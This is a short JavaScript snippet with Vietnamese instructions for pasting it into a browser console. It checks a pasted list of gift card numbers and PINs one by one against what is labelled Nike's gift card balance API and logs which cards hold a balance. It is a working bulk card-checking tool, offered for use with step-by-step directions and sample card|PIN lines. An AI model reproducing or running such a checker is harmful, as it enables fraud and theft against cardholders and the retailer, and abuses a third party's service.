let raw = [];
let result = [];
let erros = [];
let currentIndex = 0;
const processRaw = (data) => {
  raw = data.split('\n').filter(i => i && i.indexOf('|') !== -1).map(item => item.split('|'));
}


const getResult = () => {
  console.log(result.join('\n'));
  console.log(erros.join('\n'));
}

const check = () => {
  if(!raw[currentIndex]) {
    currentIndex = 0;
    alert('Xong, go getResult() de lay ket qua');
    return;
  }
  const [accountNumber, pin] = raw[currentIndex];
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
      if (this.readyState == 4) {
        if (this.status == 200)  {
           const {balance} = JSON.parse(this.response);
           result.push([accountNumber, pin, balance].join('|'));
        } else {
          erros.push([accountNumber, pin, this.response].join('|'));
        }
        currentIndex += 1;
        check();
      }
  };
  xhttp.open('POST', 'https://api.nike.com/payment/giftcard_balance/v1/', true);
  xhttp.setRequestHeader('accept', 'application/json');
  xhttp.setRequestHeader('x-nike-visitid', 58);
  xhttp.setRequestHeader('x-nike-visitorid', 'be8b20b6-1605-4eb4-85e9-b7f96a8c6d2a');
  xhttp.setRequestHeader('content-type', 'application/json');
  xhttp.setRequestHeader('appid', 'orders');
  xhttp.send(JSON.stringify({
    accountNumber,
    currency: 'USD',
    pin,
  }));

};

// Hướng dẫn dùng
// paste hết cái này vào console của f12
// sau đó gõ (chú ý ở đây dùng dấu `` nhé ko phải '' đâu)
// processRaw(`6060108931481136725|801987
// 6060108931481136725|801987
// 6060108931481136725|801987
// 6060108931481136725|801987
// 6060108931481136725|801987
// `)

// sau đó gõ check() và đợi
// nó báo xong gì gõ getResult() để lấy kết quả
